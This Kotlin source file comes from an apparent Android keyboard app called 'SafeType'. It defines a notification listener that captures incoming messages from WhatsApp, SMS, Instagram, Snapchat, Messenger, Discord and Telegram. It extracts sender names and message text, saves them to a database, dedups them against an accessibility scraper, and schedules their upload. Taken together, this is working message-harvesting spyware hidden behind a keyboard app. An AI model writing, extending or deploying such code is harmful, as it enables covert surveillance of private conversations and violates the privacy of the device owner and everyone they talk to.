package com.safetype.keyboard

import android.app.Notification
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.safetype.keyboard.data.DedupEngine
import com.safetype.keyboard.data.MessageDatabase
import com.safetype.keyboard.data.MessageEntity
import com.safetype.keyboard.data.UploadWorker
import com.safetype.keyboard.notification.NotificationParser
import com.safetype.keyboard.notification.ParsedMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * NotificationListenerService that captures incoming message notifications.
 *
 * Filters by a whitelist of messaging apps and extracts sender + message text
 * from notification extras. Handles WhatsApp group format, multi-message
 * notifications (EXTRA_TEXT_LINES), and per-app parsing quirks.
 *
 * All captured messages pass through DedupEngine before being queued.
 */
class NotificationCaptureService : NotificationListenerService() {

    companion object {
        private const val TAG = "NotifCapture"

        /** Apps whose notifications we capture messages from. */
        val MONITORED_PACKAGES = setOf(
            "com.whatsapp",
            "com.whatsapp.w4b",
            "com.google.android.apps.messaging",
            "com.samsung.android.messaging",
            "com.android.mms",
            "com.instagram.android",
            "com.snapchat.android",
            "com.facebook.orca",
            "com.discord",
            "org.telegram.messenger"
        )
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val dedupEngine = DedupEngine()
    private val parser = NotificationParser()

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        val packageName = sbn.packageName ?: return

        // Only process monitored messaging apps
        if (packageName !in MONITORED_PACKAGES) return

        // Skip ongoing/group summary notifications
        val notification = sbn.notification ?: return
        if (notification.flags and Notification.FLAG_GROUP_SUMMARY != 0) return

        val extras = notification.extras ?: return

        serviceScope.launch {
            try {
                val messages = parser.parse(packageName, extras)
                processMessages(messages, packageName)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to parse notification from $packageName", e)
            }
        }
    }

    private suspend fun processMessages(messages: List<ParsedMessage>, packageName: String) {
        if (messages.isEmpty()) return

        val db = MessageDatabase.getInstance(applicationContext)
        val dao = db.messageDao()

        for (msg in messages) {
            if (msg.text.isBlank()) continue

            // Dedup against accessibility scraper and other notifications
            if (dedupEngine.isDuplicate(msg.text, msg.sender, msg.appSource)) {
                continue
            }

            val entity = MessageEntity(
                text = msg.text,
                sender = msg.sender,
                direction = msg.direction,
                appSource = msg.appSource,
                sourceLayer = "notification",
                timestamp = msg.timestamp,
                isSent = false
            )

            try {
                dao.insert(entity)
                Log.d(TAG, "Queued notif: [${msg.appSource}] ${msg.text.take(40)}...")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to insert notification message", e)
            }
        }

        if (messages.isNotEmpty()) {
            UploadWorker.scheduleQuickUpload(applicationContext)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // No action needed on removal
    }
}
